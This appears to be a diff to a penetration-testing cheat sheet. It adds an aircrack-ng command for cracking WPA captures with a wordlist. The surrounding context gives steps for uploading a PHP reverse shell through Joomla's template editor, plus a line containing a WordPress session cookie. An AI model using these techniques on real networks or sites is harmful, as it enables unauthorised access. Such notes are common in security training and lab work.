@@ -241,6 +241,9 @@ test-huge.txt -b "wp-settings-time-1=1608569211; PHPSESSID=i1hg93k0bmjg4jgpf0m7j
 > 1. convert next line to white space `cat file.txt | tr '\r\n' ' '`
 > 1. delete white spaces from a file `cat file.txt | tr -d ' '`
 > 1. print only 1st field before ":" `cut -d ":" -f1  myfile.txt.2 > usernames`
+  
+#### Cracking passwords from .pcap file
+> 1. ```bash aircrack-ng -w /usr/share/wordlists/rockyou.txt WPA-01.cap1```
 
 #### Joomla Reverse Shell
 > 1. Go to extensions ---> templates ---> protostar, create new file, rev with extension .php, upload REVERSE SHELL php, acces it via http://<IP>/joomla/rev.php 
